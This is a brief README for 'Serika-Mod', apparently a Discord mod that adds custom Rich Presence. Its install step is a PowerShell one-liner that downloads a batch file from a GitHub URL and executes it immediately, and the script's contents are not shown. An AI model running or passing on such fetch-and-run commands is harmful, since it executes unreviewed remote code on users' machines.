# Serika-Mod

**Mod One Edit:** Custom Discord Rich Presence (RPC)

Serika-Mod is a lightweight mod that adds **custom Discord Rich Presence (RPC)** functionality. Easy to install and ready to enhance your Discord experience.

## Installation

Open **PowerShell** and run the following command:

```powershell
iwr -useb https://raw.githubusercontent.com/emr09-cmd/Serika-Mod/refs/heads/main/Discord-RPC-Mod/install.bat -OutFile install.bat; .\install.bat
